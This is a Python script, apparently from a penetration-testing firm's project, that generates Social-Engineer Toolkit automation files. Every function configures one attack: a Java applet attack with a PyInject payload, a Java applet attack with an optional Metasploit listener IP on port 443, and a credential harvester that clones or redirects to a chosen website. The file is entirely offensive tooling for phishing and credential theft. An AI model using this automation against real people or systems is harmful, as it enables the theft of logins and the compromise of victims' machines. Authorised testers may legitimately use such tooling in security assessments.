#!/usr/bin/env python

# Creates SEToolkit automation files to setup specific attacks

__author__ = 'David Bressler (@bostonlink), GuidePoint Security LLC'
__copyright__ = 'Copyright 2013, GuidePoint Security LLC'
__credits__ = ['GuidePoint Security LLC']
__license__ = 'GPL'
__version__ = '0.1'
__maintainer__ = 'David Bressler (@bostonlink), GuidePoint Security LLC'
__email__ = 'david.bressler@guidepointsecurity.com'
__status__ = 'Development'

# If Java Signed cert is disabled in set_config if not more options are needed.

# Creates Java Applet Pyinject SET automation file


def java_app_pyinject(ipaddress, redirect_web, metaip=None,):
    auto_file = "# Automagically generated Java Applet Pyinject SET automation file"
    auto_file += "\n1\n2\n1\n2\nno\n%s\n%s\n15\n443\n1\n\n" % (ipaddress, redirect_web)
    f = open('data/temp/java_app_pyinject.txt', 'w')
    f.write(auto_file)
    f.close()
    return 'data/temp/java_app_pyinject.txt'

# Creates Java Applet SET automation file


def java_applet(ipaddress, redirect_web, metaip=None):
    if metaip is None:
        auto_file = "# Automagically generated Java Applet SET automation file"
        auto_file += "\n1\n2\n1\n2\nno\n%s\n%s\n2\n16\n443\n\n" % (ipaddress, redirect_web)
        f = open('data/temp/java_applet.txt', 'w')
        f.write(auto_file)
        f.close()
        return 'data/temp/java_applet.txt'
    elif metaip is not None:
        auto_file = "# Automagically generated Java Applet SET automation file"
        auto_file += "\n1\n2\n1\n2\nyes\n%s\nyes\n%s\n%s\n2\n16\n443\n\n" % (ipaddress, metaip, redirect_web)
        f = open('data/temp/java_applet.txt', 'w')
        f.write(auto_file)
        f.close()
        return 'data/temp/java_applet.txt'

# Creates Credential Harvester automation file


def cred_harvest(ipaddress, redirect_web, metaip=None):
    auto_file = "Automagically generated Credential Harvester SET automation file"
    auto_file += "\n1\n2\n3\n2\n%s\n%s\n\n" % (ipaddress, redirect_web)
    f = open('data/temp/charvest.txt', 'w')
    f.write(auto_file)
    f.close()
    return 'data/temp/charvest.txt'

# TODO code self_signed cert functions and create logic to see if ssc is enabled within the SET config file.
